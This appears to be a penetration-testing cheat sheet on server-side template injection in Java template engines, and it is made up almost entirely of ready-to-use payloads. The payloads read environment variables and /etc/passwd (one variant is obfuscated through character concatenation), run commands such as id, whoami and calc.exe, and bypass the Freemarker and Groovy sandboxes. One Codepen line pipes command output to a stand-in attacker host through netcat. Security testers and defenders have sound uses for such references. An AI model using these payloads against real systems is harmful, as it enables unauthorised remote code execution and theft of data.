# Server Side Template Injection - Java

## Summary

- [Templating Libraries](#templating-libraries)
- [Java](#java)
    - [Java - Basic injection](#java---basic-injection)
    - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
    - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
- [Freemarker](#freemarker)
    - [Freemarker - Basic injection](#freemarker---basic-injection)
    - [Freemarker - Read File](#freemarker---read-file)
    - [Freemarker - Code execution](#freemarker---code-execution)
    - [Freemarker - Sandbox bypass](#freemarker---sandbox-bypass)
- [Codepen](#codepen)
- [Jinjava](#jinjava)
    - [Jinjava - Basic injection](#jinjava---basic-injection)
    - [Jinjava - Command execution](#jinjava---command-execution)
- [Pebble](#pebble)
    - [Pebble - Basic injection](#pebble---basic-injection)
    - [Pebble - Code execution](#pebble---code-execution)
- [Velocity](#velocity)
- [Spring](#spring)
- [Groovy](#groovy)
    - [Groovy - Basic injection](#groovy---basic-injection)
    - [Groovy - Read and create File](#groovy---read-and-create-file)
    - [Groovy - HTTP request:](#groovy---http-request)
    - [Groovy - Command Execution](#groovy---command-execution)
    - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
- [References](#references)


## Templating Libraries

| Template Name | Payload Format |
| ------------ | --------- |
| Codepen    | `#{}`     |
| Freemarker | `${3*3}`, `#{3*3}`, `[=3*3]` |
| Groovy     | `${9*9}`  |
| Jinjava    | `{{ }}`   |
| Pebble     | `{{ }}`   |
| Spring     | `*{7*7}`  |
| Thymeleaf  | `[[ ]]`   |
| Velocity   | `#set($X="") $X`             |


## Java

### Java - Basic injection

> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Java - Retrieve the system’s environment variables

```java
${T(java.lang.System).getenv()}
```

### Java - Retrieve /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

---

## Freemarker

[Official website](https://freemarker.apache.org/)
> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. 

You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

### Freemarker - Basic injection

The template can be :

* Default: `${3*3}`  
* Legacy: `#{3*3}`
* Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)

### Freemarker - Read File

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```

### Freemarker - Code execution

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

### Freemarker - Sandbox bypass

:warning: only works on Freemarker versions below 2.3.30

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## Codepen

[Official website](https://codepen.io/)
> 

```python
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

---

## Jinjava

[Official website](https://github.com/HubSpot/jinjava)
> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).

### Jinjava - Basic injection

```python
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```

Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

### Jinjava - Command execution

Fixed by https://github.com/HubSpot/jinjava/pull/230

```ps1
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

---

## Pebble

[Official website](https://pebbletemplates.io/)

> Pebble is a Java templating engine inspired by [Twig](./#twig) and similar to the Python [Jinja](./#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.

### Pebble - Basic injection

```java
{{ someString.toUPPERCASE() }}
```

### Pebble - Code execution

Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.

New version of Pebble :

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

---

## Velocity

[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)

> Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.

```python
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---


## Spring

```python
*{7*7}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

---

## Groovy

[Official website](https://groovy-lang.org/)

### Groovy - Basic injection

Refer to https://groovy-lang.org/syntax.html , but `${9*9}` is the basic injection.

### Groovy - Read and create File

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### Groovy - HTTP request:

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### Groovy - Command Execution

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### Groovy - Sandbox Bypass

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

or

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```


## References

- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)